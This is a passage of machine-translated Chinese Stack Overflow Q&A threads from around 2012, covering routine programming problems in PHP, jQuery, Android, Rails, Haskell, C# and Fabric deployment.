            $store = 'imagepng';
            break;

        case 'gif':
            $imageCreateFrom = 'imagecreatefromgif';
            $store = 'imagegif';
            break;

        default:
            return false;
    }

    $container = $imageCreateFrom($source);
    imagecopyresampled($newImage, $container, 0, 0, 0, 0, $newWidth, $newHeight, $imageWidth, $imageHeight);
    return $store($newImage, $destination);
}
var_dump(create_thumbnail_preserve_ratio('sample.jpg', 'sample_thumb_with_ratio.jpg', '255')); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-03-01T08:09:11.103

其他解决方案：

```
/**
 * Create a jpg thumbnail from a source
 **/
function create_thumbnail($source, $destination, $thumbWidth) {
    if (($info = getimagesize($source)) === FALSE)
        return null;
    switch ($info[2]) {
        case IMAGETYPE_GIF  : $src = imagecreatefromgif($source);  break;
        case IMAGETYPE_JPEG : $src = imagecreatefromjpeg($source); break;
        case IMAGETYPE_PNG  : $src = imagecreatefrompng($source);  break;
        default : null;
    }
    $width = $info[0];
    $height = $info[1];
    $widthDst = $thumbWidth;
    $heightDst = intval( $height * $thumbWidth / $width);
    $tmp = imagecreatetruecolor($widthDst, $heightDst);
    imagecopyresampled($tmp, $src, 0, 0, 0, 0, $widthDst, $heightDst, $width, $height);
    imagejpeg($tmp, $destination);
} 
```

# jquery - jQuery自动完成在控制台中显示结果，但不是下拉列表

> ID：10403925
> 
> 赞同：0
> 
> 时间：2012-05-01T20:30:15.197
> 
> 标签：jquery, json, jquery-ui, autocomplete

我正在使用 jQuery UI 的自动完成功能，在这种情况下，我的结果在控制台中显示为 JSON 就好了，但没有出现自动完成菜单。任何想法为什么？

```
var cct = $('input[name=csrf_token_name]').val();

$('input[name=search]').autocomplete({
    source: function() {
        $.ajax({
          type: 'POST',
          url: '<?php echo site_url('ajax/getSearchKeywords'); ?>',
          dataType: 'json',
          data: { search:$('input[name=search]').val(), csrf_token_name: cct },
          success: function(data) { console.log(data); },
          error: function(XMLHttpRequest, textStatus, errorThrown) { console.log(errorThrown) }
        });
    },
    appendTo: 'section.search',
    minLength: 2,
    delay: 0,
    selectFirst: true
}); 
```

此外，当我在 2 个字符后开始输入时，jQuery 确实在 DOM 中创建了以下元素：

```
<ul class="ui-autocomplete ui-menu ui-widget ui-widget-content ui-corner-all" role="listbox" aria-activedescendant="ui-active-menuitem" style="z-index: 101; top: 0px; left: 0px; display: none; "></ul> 
```

控制台显示（根据我搜索的内容而变化）：

```
["0j0sZsOqy0", "z57RuUeVnb", "nF4YFR6pMk"] 
```

这是我的 getSearchKeywords 函数：

```
public function getSearchKeywords()
{
    header('Cache-Control: no-cache, must-revalidate');
    header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
    header('Content-type: application/json');

    echo json_encode($this->tasks->getSearchKeywords($this->input->post('search')));
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:38:17.673

您没有正确使用回调函数。

您的源函数应该有 2 个参数 - 一个包含术语的对象和一个将结果传递到的回调函数。通过ajax检索词条后，需要调用回调函数。

就像是：

```
function getTerms(term_obj, callback) {
        $.ajax({
          type: 'POST',
          url: '<?php echo site_url('ajax/getSearchKeywords'); ?>',
          dataType: 'json',
          data: { search:term_obj.term, csrf_token_name: cct },
          success: function(data) { callback(data) },
          error: function(XMLHttpRequest, textStatus, errorThrown) { console.log(errorThrown) }
        });

} 
```

然后，将该函数 ^^ 作为自动完成器的来源传递。

# jquery - 成功后明文值？

> ID：10403927
> 
> 赞同：0
> 
> 时间：2012-05-01T20:30:16.840
> 
> 标签：jquery

这是在 WordPress 网站上。我正在使用以下 php 从输入框中获取用户的电子邮件并将其添加到我的 mailchimp 列表中。有一个 js 和 php 页面可以完成所有繁重的 mailchimp 工作，但这对我的问题应该不重要：

```
<?php  
// store-address.php

function storeAddress(){

    // Validation
    if(!$_GET['email']){ return "No email address provided"; } 

    if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$/i", $_GET['email'])) {
        return "Email address is invalid"; 
    }

    require_once('MCAPI.class.php');
    // grab an API Key from http://admin.mailchimp.com/account/api/
    $api = new MCAPI('my-api-key');

    // grab your List's Unique Id by going to http://admin.mailchimp.com/lists/
    // Click the "settings" link for the list - the Unique Id is at the bottom of that page. 
    $list_id = "my-list";

    if($api->listSubscribe($list_id, $_GET['email'], '') === true) {
        // It worked!   
        return 'Success! Check your email to confirm sign up.';
    }else{
        // An error ocurred, return error message   
        return 'Error: ' . $api->errorMessage;
    }

}

// If being called via ajax, autorun the function
if($_GET['ajax']){ echo storeAddress(); }
?> 
```

然后在用户输入电子邮件的页面上，它会抓取响应并显示消息结果。这是那部分：

```
<div id="emailList">
    <form id="signup" action="<?=$_SERVER['PHP_SELF']; ?>" method="get" >
    <label>signup for our email list</label>

    <input type="text" id="email" class="email" name="email" />
    <input type="submit" value="OK" id="emailSubmit" name="submit" />

    </form>
    <script type="text/javascript" src="path/to/js/jquery-1.4.2.min.js"></script>
    <script type="text/javascript" src="path/to/js/mailing-list.js"></script>
</div><!-- end emailList -->
<div id="response">
    <? require_once('inc/store-address.php'); 
    if($_GET['submit'])
    {
        echo storeAddress(); 
    } ?>
</div><!-- end response-->
<script type="text/javascript">
    $(document).ready(function() {
        $("#emailSubmit").click(function() {
                    $('#response').fadeIn(1500).delay(3500).fadeOut(1500);
                    });
                });
</script> 
```

我的问题很简单。我怎样才能实现某些东西，以便如果它成功并返回消息“成功！检查您的电子邮件以确认注册”。它只会清除输入框的值而不是将其预先填充？输入框 id 是“电子邮件”。

我想我需要使用 . `val("")`不知何故，但我不明白只有在成功的情况下才能清除电子邮件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:44:10.520

一个简单的解决方案是：

PHP

```
if($api->listSubscribe($list_id, $_GET['email'], '') === true) {
    // It worked!   
    return '<span class="success">Success! Check your email to confirm sign up.</span>';
}else{
    // An error ocurred, return error message   
    return 'Error: ' . $api->errorMessage;
} 
```

JS

```
$(document).ready(function() {
    if($('.success').length > 0) {
         $('#email').val('');
    }
}); 
```

编辑：完整的ajax解决方案

```
$(document).ready(function() {
    var clearOnSuccess = function() {
        if ($('.success').length > 0) {
            $('#email').val('');
        }
    };
    clearOnSuccess();

    $('#signup').submit(function() {
        var data = $(this).serializeArray();
        data.push({'name': 'ajax', 'value': 1});
        var jqXHR = $.ajax({
            url: $(this).attr('action'),
            type: $(this).attr('method'),
            data: data
        });

        jqXHR.done(function(data) {
            $('#response').html(data).fadeIn(1500).delay(3500).fadeOut(1500);
            clearOnSuccess();
        });
        return false;
    });
}); 
```

# android - Android：如何在接听和结束通话时显示消息？

> ID：10403931
> 
> 赞同：0
> 
> 时间：2012-05-01T20:30:30.070
> 
> 标签：android, telephony

我正在应用以下代码来显示三种状态的消息，

1) 通话被拒 2) 通话已接 3) 通话结束

```
 TelephonyManager telephonyManager;

     PhoneStateListener listener = new PhoneStateListener() {

public void onCallStateChanged(int state,String incomingNumber) {

switch (state) {

case TelephonyManager.CALL_STATE_IDLE:

Toast.makeText(c, "Call Ended..",Toast.LENGTH_LONG).show();

    Log.i("stop", "Call Ended....");

        break;

case TelephonyManager.CALL_STATE_OFFHOOK:

     Toast.makeText(c, "Call Picked..",Toast.LENGTH_LONG).show();
    Log.i("received", "Call Picked....");

        break;

case TelephonyManager.CALL_STATE_RINGING:

     Toast.makeText(c, "Call Ringing.." + phonenumber,
    Toast.LENGTH_LONG).show();
                break;
    }

    }

    };
// Register the listener with the telephony manager
telephonyManager.listen(listener,PhoneStateListener.LISTEN_CALL_STATE);

        } 
```

当我拒绝呼叫时，它也进入 hook_state，如何显示两个单独接收和呼叫拒绝/拒绝的消息

提前致谢..

请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T08:24:08.000

我想你一定已经解决了这个问题……但是对于其他有类似问题的人。

`OFFHOOK`如果您拒绝来电，电话不会进入状态。

对于来电，它首先进入“RINGING”状态，然后进入`IDLE`状态。

对于拨出呼叫，它进入`OFFHOOK`状态然后`IDLE`状态。

# facebook - 我的哪些朋友不喜欢我的页面？

> ID：10403932
> 
> 赞同：1
> 
> 时间：2012-05-01T20:30:41.973
> 
> 标签：facebook, facebook-page

4 年前，我在 FB 上创建了一个个人网站。其实我有2000个朋友。我有一个 FB 粉丝专页。

我现在希望我所有的朋友都会“喜欢”（成为）我的页面，这样我就可以关闭我的个人 FB 站点。

我看到的是“1005 个朋友喜欢 [我的页面]”。

是否有一个 FBQL 声明，它向我展示了我所有的 995 个朋友，他们不喜欢（成为我的 FB 页面的粉丝）？

有没有可能得到这个朋友的名单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:38:37.007

起点[http://developers.facebook.com/docs/reference/fql/page_fan/](http://developers.facebook.com/docs/reference/fql/page_fan/)

请记住，除非他们允许，否则您无法做到这一点，所以最好问他们..

> 您不能将此信息暴露给除登录用户之外的任何人，因为它是私密的，这样做会违反我们的平台政策

[http://developers.facebook.com/docs/reference/fql/friendlist/](http://developers.facebook.com/docs/reference/fql/friendlist/)

# c# - 在成熟的库/框架上改造单元/回归测试？

> ID：10403936
> 
> 赞同：4
> 
> 时间：2012-05-01T20:31:02.030
> 
> 标签：c#, javascript, wcf, frameworks

对于我的团队来说，一个持续的症结是我们的“通用”库。（看这里的相关问题，说“框架”可能更正确）。

目前包括 v1、v2 和 v3。其中 v3 用于所有新应用程序。它包含多个 WCF 服务、一个包含业务对象的类库和一个用于 js/css/images 的公共 Web 目录。

我们希望在前进的过程中做正确的事情，特别是因为我们都积极开始为公共图书馆做出贡献。它正在变成一个大泥球，部署它对每个人来说都是可怕的。

我们的第一个想法是建立一个测试服务器，对所有代码运行单元测试，以确保没有任何问题。问题是为所有东西编写测试非常乏味，坦率地说，没有人有这样的时间。我们也都缺乏编写适当单元测试的经验。话虽如此，如果这是最好的路线，我们会完成它。

在那之后，我们不太确定。我们将通用代码视为应用持续集成实践的地方，因为我们编写的许多不同的应用程序都在使用它。

这也引入了一些问题，例如在本地复制 DLL，或者将所有内容都放在某处的一台服务器上。我们已经感觉自己身处 DLL Hell 中，并且想要出去。

（好的）软件商店用来管理这种情况的策略是什么？

任何和所有的建议表示赞赏。如果需要更多信息，请询问。我很乐意提供。

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-01T20:50:29.977

> 问题是为所有东西编写测试非常乏味，坦率地说，没有人有这样的时间

真正的问题是您在没有 TDD 方法的情况下编写代码（应该首先编写测试），现在在一个以测试为重点的项目中（应该在每个项目中进行）测试通常需要更多时间或相同的时间来编写编写真正的代码。为什么？因为当您在编写测试时遵循 TDD 时，您实际上是在设计您的代码，并且您遵循这种模式 red-green-refactor

你绝对应该开始为你的代码编写测试，现在的问题（我敢于接受这个假设）是你和你的团队没有编写可测试的代码。

检查此线程[https://stackoverflow.com/a/10365073/1268570](https://stackoverflow.com/a/10365073/1268570)

假设并非所有代码都被编写为可测试的，那么创建单元测试将是一件非常痛苦的事情，但是您可以编写某种集成测试。

关于CI服务器，你应该去实现它，实际上CI不应该是每个严肃项目的可选

我实际上正在创建一个工具来简化与 CI 服务器的集成，它由一组 MSBuild 脚本组成，这些脚本包装了第三方工具来执行每个项目都应该遵循的常见任务，我还没有发布，因为我还没有写完文档，但是它现在可以使用了，你可以看看：

[https://github.com/jupaol/NCastor/tree/develop](https://github.com/jupaol/NCastor/tree/develop)

检查开发分支，因为在发布新版本之前我不会合并到 master

关于版本控制，如您所说，留下“dll 地狱”，这让我认为您没有版本控制标准，我建议您检查语义版本控制模型：

[http://semver.org/](http://semver.org/)

顺便说一句，我发现在组织内部分发新组件版本的一个好策略是设置私有 Nuget 服务器，并将组件的 Nuget 包发布到该服务器。当然，要实现这一点，您需要将组件打包为 Nuget，但这很容易做到。

以这篇文章为参考，全力以赴：

*   使用 TDD 方法编写单元测试

*   编写干净的可测试代码

*   实现 CI 服务器

[http://misko.hevery.com/2008/07/16/top-10-things-i-do-on-every-project/](http://misko.hevery.com/2008/07/16/top-10-things-i-do-on-every-project/)

我建议您在编写测试时使用的工具：

*   [自动夹具](http://autofixture.codeplex.com/)

*   [起订量](http://code.google.com/p/moq/)

*   [流利的断言](http://fluentassertions.codeplex.com/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-01T20:39:01.197

给自己买两本书，让它们成为必读。

1.  Michael Feathers 的“有效处理遗留代码”
2.  Roy Osherove 的“单元测试艺术”

第一本书将教你处理遗留代码和重构模式的最佳实践，以及如何围绕你的代码进行有意义的单元测试。

对于有经验的单元测试人员和新手单元测试人员来说，第二本书都是极好的资源。

最后，永远不要让借口/理由“一切都非常乏味，坦率地说，没有人有那样的时间。” 阻止您获得良好实践。一个好的有意义的单元测试总比没有好。

使其成为一个标准，即在没有单元测试支持的情况下不会编写任何“新”代码。并让代码审查成为您日常工作的一部分。

祝好运并玩得开心点。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-01T20:42:24.140

> 坦率地说，没有人有这样的时间。

...但是您有足够的时间来纠正“它”在事后引起的问题？

如果有的话，为消耗“common”的应用程序创建冒烟测试，这些测试将运行核心功能，以确保它们在新的通用版本之后仍然有效。

之后，查看一些代码覆盖率工具，看看你没有测试什么。然后，作为一个团队，您可以添加逐渐建立覆盖范围的项目。

<soapbox>
您*应该*编写单元测试，尤其是对于“通用”代码，因为该代码可能会随着使用方式略有不同的开发人员的突发奇想而改变。
</肥皂盒>

# ruby-on-rails - 如何从传递给rails中的模型的种子数据创建复选框列表

> ID：10403937
> 
> 赞同：0
> 
> 时间：2012-05-01T20:31:08.837
> 
> 标签：ruby-on-rails

我有一个使用seed.rb 从.txt 文件加载的俱乐部和活动列表（即乐队或棒球）。我想在我的视图中创建一个复选框列表，用户可以在其中检查他/她参与的任何活动。我在为活动列表创建迭代时遇到问题，并且收到“nil:NilClass 的未定义方法‘每个’”错误。我的模型称为活动。

我的控制器有 @activities = Activity.all 和

我的观点有 <% @activities.each 做 |a| %>

但是那条线不起作用。Activity 模型有一个名为 :name 的字符串属性，如果有帮助的话。有人有想法我可以试试吗？谢谢！

路线。rb

```
CollegeConnection::Application.routes.draw do
  devise_for :users

  resources :quizzes
  resources :users
  resources :majors
  resources :activities

  root :to => "users#welcome"
 end

quiz controller:

class QuizzesController < ApplicationController
before_filter :authenticate_user!

# GET /quizzes
# GET /quizzes.json

def index
  @quizzes = Quiz.all

  respond_to do |format|
  format.html # index.html.erb
  format.json { render json: @quizzes }
  end
end

# GET /quizzes/1
# GET /quizzes/1.json
def show
  @quiz = Quiz.find(params[:id])

  respond_to do |format|
  format.html # show.html.erb
  format.json { render json: @quiz }
  end
end

# GET /quizzes/new
# GET /quizzes/new.json
def new
  @quiz = Quiz.new

  respond_to do |format|
    format.html # new.html.erb
    format.json { render json: @quiz }
  end
end

# GET /quizzes/1/edit
def edit
  @quiz = current_user.quizzes.build(params[:id])
end

# POST /quizzes
# POST /quizzes.json
def create
  @quiz = Quiz.new(params[:quiz])
  @quiz.userName=current_user.name
  @activities = Activity.all
  respond_to do |format|
    if @quiz.save
      format.html { redirect_to @quiz, notice: 'Thank You for Taking the Quiz!.' }
      format.json { render json: @quiz, status: :created, location: @quiz }
    else
      format.html { render action: "new" }
      format.json { render json: @quiz.errors, status: :unprocessable_entity }
    end
  end
end

# PUT /quizzes/1
# PUT /quizzes/1.json

def update
  @quiz = Quiz.find(params[:id])

  respond_to do |format|
    if @quiz.update_attributes(params[:quiz])
      format.html { redirect_to @quiz, notice: 'Quiz was successfully updated.' }
      format.json { head :ok }
    else
      format.html { render action: "edit" }
      format.json { render json: @quiz.errors, status: :unprocessable_entity }
    end
  end
end

# DELETE /quizzes/1
# DELETE /quizzes/1.json
def destroy
  @quiz = Quiz.find(params[:id])
  @quiz.destroy

  respond_to do |format|
    format.html { redirect_to quizzes_url }
    format.json { head :ok }
  end
end 
```

结尾

_form.html.erb 测验视图

```
<%= form_for(@quiz, html: {class: "nice"}) do |f| %>
  <% if @quiz.errors.any? %>
    <div id="error_explanation">
      <h2><%= pluralize(@quiz.errors.count, "error") %> 
        prohibited this quiz from being saved:
      </h2>

    <ul>
      <% @quiz.errors.full_messages.each do |msg| %>
        <li><%= msg %></li>
      <% end %>
    </ul>
    </div>
<% end %>

<div class="field">
  <%= f.label :q1, "Current/Possible Major" %><br />
  <%= f.collection_select(:q1, Major.all, :name, :name) %>
</div>
<div class="field">
  <%= f.label :q2, "Activities" %><br />
  <%= f.collection_select(:q2, Activity.all, :name, :name) %>
</div>

<% @activities.each do |a| %> 
<%= a.check_box :active %> 
<%= a.submit "Update" %> 
<% end %>

<div class="field">
  <%= f.label :q3 %><br />
  <%= f.text_area :q3, class: 'input-text' %>
</div> 

<div class="actions">
  <%= f.submit "Submit" %>
</div> 
```

好的，所以我找到了一个部分解决方案：

```
<div class="field">
  <%= f.label :q2, "Activities" %><br />  
  <% for activity in Activity.find(:all) %>
    <div>
      <%= check_box_tag(:q2, activity.name) %> <%=activity.name %>
    </div>
  <% end %>
</div> 
```

它列出了所有旁边带有名称的复选框，但是它没有将值设置为 q2 的答案（问题二的 quiz 属性）我认为我对复选框标签做错了。我试过 f.check_box 但它也不起作用。有什么帮助吗？

错误：

```
NoMethodError in Quizzes#new

Showing /Users/Daniel/Documents/cis196/CollegeConnection/app/views/quizzes/_form.html.erb
where line #24 is raised

undefined method `merge' for "Debate\n":String
Extracted source (around line #24):

21:     <%= f.label :q2, "Activities" %><br />  
22:     <% for activity in Activity.find(:all) %>
23:     <div>
24:        <%= f.check_box(:q2, activity.name) %> <%=activity.name %>
25:     </div>
26:   <% end %>
27:   </div>
Trace of template inclusion: app/views/quizzes/new.html.erb

Rails.root: /Users/Daniel/Documents/cis196/CollegeConnection 

Application Trace | Framework Trace | Full Trace
app/views/quizzes/_form.html.erb:24:in `block (2 levels) in      _app_views_quizzes__form_html_erb__435461842904466959_70320063188680' 
```

app/views/quizzes/_form.html.erb:22:in `each' app/views/quizzes/_form.html.erb:22:in`block in _app_views_quizzes__form_html_erb__435461842904466959_70320063188680' app/views/quizzes/_form.html.erb:1:in `_app_views_quizzes__form_html_erb__435461842904466959_70320063188680' app/views/quizzes/new.html.erb:6:in`_app_views_quizzes_new_html_erb__735256988922435877_70320063679640' app/controllers/quizzes_controller.rb:31:in `new'要求

参数：

无 显示会话转储

显示环境转储

回复

标题：

没有任何

测验模型

```
Class Quiz < ActiveRecord::Base
belongs_to :user

validates :q1, :presence => true
validates :q2, :presence => true
validates :q3, :presence => true

serialize :q2 
```

结尾

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T22:05:21.200

这就是我认为正在发生的事情。您的 _form 部分是部分的，因为它可能由您的创建视图和编辑视图共享。_form 部分依赖于被初始化的@activities。您仅在创建操作中对其进行了初始化。尝试这样的事情：

quizzes_controller.rb

```
QuizzesController < ApplicationController
  before_filter load, :only =>[:create, :edit]
  def load
    @activities = Activity.all
  end
end 
```

然后你可以删除

```
@activities = Activity.all 
```

从您的创建操作中，@activities 将在您的创建和编辑操作中初始化。

更新：

check_box_tag 接受 3 个（或更多）参数，第一个是元素的 id，第二个是要传递的值，第三个是一个布尔值，如果为 true，则会检查复选框。

所以现在你必须发布你的模型和关联做 Quiz 'has_many' 活动等。

# codeigniter - CodeIgniter 模型中的正确语法

> ID：10403939
> 
> 赞同：0
> 
> 时间：2012-05-01T20:31:16.777
> 
> 标签：codeigniter, syntax

我试图在我的 Code Igniter 模型中重用变量，但我不能完全理解语法。我遇到的问题在第 4 行。

```
class Products_model extends CI_Model {

var $gcsServerIpAddress = "11.22.33.44";
var $gcsServerAddress = "http://".$this->gcsServerIpAddress."/eft/"; 
```

我尝试过对象语法：$this->foo。我也尝试过使用变量名：$foo。他们都没有工作。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:33:38.300

尝试在构造函数中设置值。

```
class Products_model extends CI_Model {
    var $gcsServerIpAddress;
    var $gcsServerAddress;

    function __construct(){
        $this->gcsServerIpAddress = "11.22.33.44";
        $this->gcsServerAddress = "http://".$this->gcsServerIpAddress."/eft/"; 
    }
} 
```

# haskell - 从文件中读取类型

> ID：10403940
> 
> 赞同：1
> 
> 时间：2012-05-01T20:31:18.753
> 
> 标签：haskell

我在读取文件并将其加载到类型 Film 的列表中时遇到问题：

```
testDatabase :: [Film]
testDatabase = [(Film "Ridely Scott" "Test" 2012 [("Zoe",2),("Test",1)]),(Film "Test1" "Test1" 2012 [("Test",4),("Test",5)])]

loadFromFile :: IO ()
loadFromFile = do
         putStrLn "Enter the input filename: "
         name <- getLine
         contents <- readFile name
         let testDatabase = length contents `seq` (read contents :: [Film])
         putStrLn formatDatabase
         putStrLn "Done" 
```

Haskell 使用以下方法保存了文本文件：

```
saveToFile :: IO ()
saveToFile = do
    putStrLn "Enter the output filename: "
    name <- getLine
    writeFile name (show testDatabase)
    putStrLn "Done" 
```

它的格式正确，它显示了大约 30 个条目，但是当调用加载方法时，我得到了运行时 testDatabase 中的数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:36:03.940

看起来您来自命令式编程背景，并且是函数式编程的新手。需要注意的是：您*不能*更改变量的值。曾经。

在这里，您只需在函数的本地范围内创建一个新的“变量” `loadFromFile`：

```
 let testDatabase = length contents `seq` (read contents :: [Film]) 
```

然后完全不知道`formatDatabase`哪个必须看起来像这样：

```
formatDatabase :: String
formatDatabase = ... something with the global testDatabase ... 
```

你应该做的是拥有`formatDatabase`一个真正的函数（而不是一个常量`String`），并将数据库作为参数：

```
formatDatabase :: [Film] -> String
formatDatabase database = ... something with database ... 
```

并像这样打印：

```
 let testDatabase = length contents `seq` (read contents :: [Film])
     putStrLn (formatDatabase testDatabase) 
```

# android - 包装/覆盖 ContentProvider

> ID：10403941
> 
> 赞同：0
> 
> 时间：2012-05-01T20:31:22.037
> 
> 标签：android, permissions, android-contentprovider

是否可以包装现有的 ContentProvider？基本上，我厌倦了每个应用程序都想要我的所有信息，所以我想写一些东西来捕捉我的位置、身份等的调用，并根据调用者决定是传递它还是返回虚假数据。还有其他方法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:34:19.383

> 基本上，我厌倦了每个应用程序都想要我的所有信息，所以我想写一些东西来捕捉我的位置、身份等的调用，并根据调用者决定是传递它还是返回虚假数据

您可以将其作为您自己的自定义固件的一部分，在其中将所有现有权限重构`ContentProviders`为新权限，以便您的权限接管。

否则，不——特定权限的第一个提供者“获胜”，因此固件总是获胜。您不能覆盖内置提供程序。

# c# - HttpWebRequest 对每个主机 2 个连接的限制是否适用于 HttpClient？

> ID：10403944
> 
> 赞同：5
> 
> 时间：2012-05-01T20:31:35.297
> 
> 标签：c#, httpwebrequest, dotnet-httpclient

有没有人知道，如果每个主机 2 个连接的（默认）速率限制适用于 System.Net.Http.HttpClient。

请说明您的信息来源以及是否可以像[这样](https://stackoverflow.com/questions/4092206/limit-of-concurrent-httpwebrequests)增加此限制，或者是否有更好/更简单的方法来做到这一点。

另外，是否有限制器实现？例如，每分钟最多 40 个电话？

[这里](http://eprystupa.wordpress.com/2009/12/19/throttling-high-frequency-data-feed-using-reactive-extensions-for-net/)有一篇关于使用 Reactive Extensions 的节流策略的好文章，但我想知道是否有 HttpClient 方法来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T22:51:38.610

根据[文档](http://msdn.microsoft.com/en-us/library/system.net.http.httpclient%28v=vs.110%29.aspx)（参见备注的第三段），默认`HttpClient`使用 a `HttpWebRequest`。并且`HttpWebRequest`每个主机确实有两个并发连接的限制。

`HttpClient`没有说明`HttpClientHandler`（默认）是否更改了`HttpWebRequest`. 我怀疑不是。

如果要更改它，则必须创建自己的[HttpMessageHandler](http://msdn.microsoft.com/en-us/library/system.net.http.httpmessagehandler%28v=vs.110%29.aspx)并将引用传递给`HttpClient`构造函数。

# python - 使用 Fabric 部署到多个 EC2 服务器

> ID：10403946
> 
> 赞同：8
> 
> 时间：2012-05-01T20:31:43.250
> 
> 标签：python, amazon-ec2, fabric

我想知道是否有人有部署到带有[结构的 ec2 上的负载均衡器后面的多个服务器的经验](http://docs.fabfile.org/en/1.4.1/index.html)

我已经使用了一段时间的结构，并且没有任何问题，或者部署到多个服务器，但是在这种情况下我想做的是（假设我有十个实例正在运行）取消注册一半 (5)来自我的负载均衡器的盒子，将我的代码部署到它们并运行烟雾测试，如果一切看起来都不错，请再次向负载均衡器注册它们并取消注册剩余的 5 个实例并部署到它们，然后将它们注册回负载均衡器。

我完成任何单个任务（注销、运行测试、部署等）都没有问题，我只是不知道如何以简单的方式组织我的主机，以便我可以部署前半部分，然后是后半部分. Fabric 似乎设置为在所有主机上按顺序运行相同的任务（主机 1 上的任务 1、主机 2 上的任务 1、主机 1 上的任务 2、主机 2 上的任务 2 等等）

我的第一个想法是创建一个任务来处理注销、部署和测试的第一部分，然后为服务器的后半部分设置 env.hosts，但我觉得这似乎有点做作。

以前有没有人用 Fabric 模拟过类似的东西？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T21:47:08.493

您可以通过定义**角色**（用于聚合主机）并在一个角色上执行任务，然后在第二个角色上运行测试和部署来简化这一过程。

示例`roledefs`：

```
env.roledefs = {
    'first_half': ['host1', 'host2'],
    'second_half': ['host3', 'host4'],
}

def deploy_server():
    ...
    # deploy one host from current role here

def deploy():
    # first role:
    env.roles = ['first_half']
    execute('deploy_server')
    test()  # here test deployed servers
    # second role:
    env.roles = ['second_half']
    execute('deploy_server') 
```

更多链接：

*   [`env.roledefs`文档](http://docs.fabfile.org/en/1.4.1/usage/env.html#roledefs)，
*   [`env.roles`文档](http://docs.fabfile.org/en/1.4.1/usage/env.html#roles)，
*   [执行模型](http://docs.fabfile.org/en/1.4.1/usage/execution.html)，
*   [`execute()`文档](http://docs.fabfile.org/en/1.4.1/api/core/tasks.html#fabric.tasks.execute)，

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T21:36:46.227

您想使用[execute()](http://docs.fabfile.org/en/1.4.1/usage/execution.html#intelligently-executing-tasks-with-execute)函数。这将允许您执行以下操作：

```
def update():
     deallocate()
     push_code()
     smoke_test() #could fail fast
     reallocate()

def deploy():
     execute(update, hosts=first_five)
     execute(update, hosts=last_five) 
```

您还可以在部署中使每个 deallocate、push_code 和 Smoke_test 任务成为 execute() 调用，然后运行所有 deallocate，然后运行所有代码推送等。

然后进行某种检查，然后继续其他人运行所述任务。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-20T01:14:46.723

我已经成功地将 Fabric 与 boto 结合起来。我使用 boto 填充主机列表。您可以使用 @parallel 装饰器来限制一次执行的主机数量。该命令如下所示；

`fab running deploy`

代码看起来像这样；

```
@task
@runs_once
def running():
    ec2conn = ec2.connect_to_region(region)
    reservations = ec2conn.get_all_instances(filters={'instance-state-name': 'running'})
    instances = list(chain.from_iterable(map(lambda r: r.instances, reservations)))
    env.hosts = list(chain.from_iterable(map(lambda i: i.public_dns_name, instances)))

@task
@parallel(pool_size=5)
def deploy():
    # do stuff on n<=5 hosts in parallel 
```

如果您需要处理一部分主机，我建议您使用标签。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-04T20:23:41.847

或者您可以简单地编写一个设置一些变量的方法，例如：

```
def live():
    global PATH, ENV_PATH
    env.hosts = ["22.2.222.2"]
    env.user = 'test'
    PATH = '/path/to/project'
    # optional, is using virtualenv
    ENV_PATH = '/path/to/virtualenv'
    # overwri 
```

您需要在当前机器上更改的任何变量

在运行部署命令之前，运行：

```
fab live deploy 
```

详细信息：[http ://simionbaws.ro/programming/deploy-with-fabric-on-multiple-servers/](http://simionbaws.ro/programming/deploy-with-fabric-on-multiple-servers/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-01T20:49:08.807

Fabric 未设置为在所有主机上运行相同的任务。

除了`-H`您可以使用命令行参数为特定任务显式设置主机这一事实之外，您还可以使用[此](http://docs.fabfile.org/en/1.4.1/usage/execution.html#roles)[模式](http://docs.fabfile.org/en/1.4.1/usage/execution.html#globally-via-env)和 更新的模式来完成您想要的操作。

更新：[这里](http://docs.fabfile.org/en/1.4.1/usage/execution.html#intelligently-executing-tasks-with-execute)显示了如何使用`roles`

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-05-01T20:59:06.470

您可以将一个列表（或任何可迭代的）传递给主机装饰器，而不是干预 env.hosts。就像是：

```
def deploy(half_my_hosts):
    @hosts(half_my_hosts)
    def mytask():
        # ...
    mytask() 
```

然后你可以以任何你喜欢的方式拆分你的 env.hosts 并将它传递给 deploy()

# .net - 将非托管 DLL 部署到输出目录

> ID：10403948
> 
> 赞同：3
> 
> 时间：2012-05-01T20:31:51.617
> 
> 标签：.net, deployment, msbuild, unmanagedresources

我正在尝试组织我的 VS 2010 解决方案。阻碍我的一个领域是使用非托管 DLL。我无法将它们添加为引用，因为 DLL 是非托管的。以前的方法是在 Pre/Post 构建事件期间将 DLL 从“lib”文件夹 xcopy 到输出文件夹。这样做的缺点是每次构建都会发生不必要的复制，并且清理操作从未从输出文件夹中删除 DLL。

我理想的解决方案是将 DLL 合并到 VS lib 文件夹中，并利用“如果更新则复制”功能。但是，VS 在输出文件夹中创建了一个 lib 文件夹并将 DLL 放在那里。请注意，我不喜欢将 DLL 放在我的项目树的顶层。有很多 DLL，这似乎污染了项目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:48:15.257

